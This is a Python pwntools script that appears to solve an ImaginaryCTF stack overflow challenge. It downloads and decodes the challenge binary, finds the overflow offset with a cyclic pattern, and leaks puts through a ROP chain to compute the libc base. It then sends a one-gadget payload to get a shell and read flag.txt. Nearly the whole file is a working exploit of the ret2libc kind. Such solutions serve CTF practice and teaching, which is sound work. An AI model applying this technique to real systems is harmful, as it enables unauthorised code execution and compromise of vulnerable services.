from  pwn import *
import os

r = remote('chal.imaginaryctf.org', 42020)

#write binary file
r.recvuntil('---------------------------BEGIN  DATA---------------------------\n')
data = r.recvline()
r.recv()
data.strip()
open("/tmp/remote.b64", "wb+").write(data)
os.system("cat /tmp/remote.b64 | base64 -d > /tmp/remote.bin")
os.system('chmod +x /tmp/remote.bin')

#load remote binary
e = context.binary = ELF('/tmp/remote.bin')
p = process(e.path)

#find offset
p.sendline(cyclic(1000, n=8))
p.wait()
core = p.corefile
OFFSET = cyclic_find(core.read(core.rsp, 8), n=8)
log.info("offset found:" + str(OFFSET))

libc = ELF('libc6_2.28-10_amd64.so')
pop_rdi =  0x40120b

# leak libc-puts
MAIN_PLT = e.symbols['main']
PUTS_PLT = e.plt['puts']
POP_RDI = pop_rdi
func_name = "puts"
FUNC_GOT = e.got[func_name]
r.sendline(OFFSET * b'A' + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT))
r.recvline()

#Parse leaked address
puts_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
log.info("Leaked libc address for puts: "+ hex(puts_leak))

#find libc base
libc.address = puts_leak - libc.symbols[func_name]
log.info("libc base @ %s" % hex(libc.address))

og = libc.address + 0x448a3 #one gadget

#final payload
r.clean()
r.sendline(OFFSET*b'A' + p64(og) + b"\x00"*100)
r.recvline()
r.sendline("cat flag.txt")
print(r.recvline())
r.close()